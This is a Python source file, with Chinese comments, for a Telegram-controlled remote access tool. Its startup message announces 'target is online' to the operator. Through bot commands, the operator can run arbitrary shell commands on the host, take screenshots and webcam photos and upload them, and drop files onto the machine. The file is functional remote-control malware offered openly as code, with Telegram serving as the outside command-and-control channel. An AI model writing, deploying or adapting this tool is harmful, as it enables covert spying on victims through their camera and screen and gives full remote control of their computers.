#!/usr/bin/env python
# -*- coding: utf-8 -*-
import tg # 导入token,id
import telepot,requests
import pprint # debug
import os
import time
from telepot.loop import MessageLoop
from Mod import capshot
from Mod import shell

token = tg.token	# token='nnnnnnnnn:nnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnn'
known_ids = [tg.id]	# known_ids=['nnnnnnnnn','nnnnnnnnn','nnnnnnnnn']
bot = telepot.Bot(token)
answerer = telepot.helper.Answerer(bot)

def checkchat_id(chat_id):
	return len(known_ids) == 0 or str(chat_id) in known_ids

def send_message(chat_id, message,reply=None):
	try:
		bot.sendMessage(chat_id, message,reply_markup=reply)
	except Exception as err:
		print("[!] Error sending message: %s" % str(err))
	return
		
def on_inline_query(msg):
	def compute():
		query_id, from_id, query_string = telepot.glance(msg, flavor='inline_query')
		print('Inline Query:', query_id, from_id, query_string)
		if query_string!='':
			articles = [{'type': 'article','id': '1', 'title': query_string,'message_text': query_string},
						]
			"""
			from telepot.namedtuple import InlineQueryResultArticle, InputTextMessageContent
			articles =[InlineQueryResultArticle(type='article', id='1', title=query_string, input_message_content=InputTextMessageContent(message_text=query_string, parse_mode=None, disable_web_page_preview=None), reply_markup=None, url=None, hide_url=None, description=None, thumb_url=None, thumb_width=None, thumb_height=None)]
			具体API可以查阅https://core.telegram.org/bots/api#inlinequeryresult
			"""
		else:
			articles = [{'type': 'article','id': '1', 'title': '咕咕咕','message_text': '咕咕咕'}]
		return articles
	answerer.answer(msg,compute)

def on_chat_message(msg):
	flavors=telepot.flance(msg)[0]
	content_type, chat_type, chat_id = telepot.flance(msg)[1]
	if checkchat_id(chat_id):
		response =''
		# pprint.pprint(msg)
		if content_type == 'text':
			command = msg['text']
			if command.startswith('/shell'):
				sc=command[len('/shell'):]
				if sc!='':
					out=shell.run(sc)
				else:
					out=shell.run('whoami')
				bot.sendChatAction(chat_id, 'typing')
				response = out.decode('gbk')
			elif command == '/screenshot':
				capshot.get_shot('screenshot.jpg')
				bot.sendChatAction(chat_id, 'upload_photo')
				bot.sendDocument(chat_id, open('screenshot.jpg', 'rb'))
				os.remove('screenshot.jpg')
			elif command == '/camerashot':
				capshot.get_cams('camerashot.jpg')
				bot.sendChatAction(chat_id, 'upload_photo')
				bot.sendDocument(chat_id, open('camerashot.jpg', 'rb'))
				os.remove('camerashot.jpg')			
		elif content_type == 'document':
			file_id = msg['document']['file_id']
			file_name = msg['document']['file_name']
			bot.download_file(file_id,file_name)
			bot.sendChatAction(chat_id, 'upload_document')
			response = 'File saved as ' + file_name
		if response != '':
			if len(response)-1<4096:
				print(response)
				send_message(chat_id,response)
			else:
				with open("output.txt","w") as f:
					f.write(response)
				bot.sendDocument(chat_id, open('output.txt', 'rb'))
				os.remove('output.txt')
				send_message(chat_id,'太长了！！！')

def main():
	MessageLoop(bot,{'chat':on_chat_message,'inline_query': on_inline_query}).run_as_thread()
	if len(known_ids) > 0:
		for known_id in known_ids:
			sayhi="目标已上线"
			send_message(known_id, sayhi)
	print('Listening ...')
	while True:
		time.sleep(10)
if __name__ == '__main__':
    main()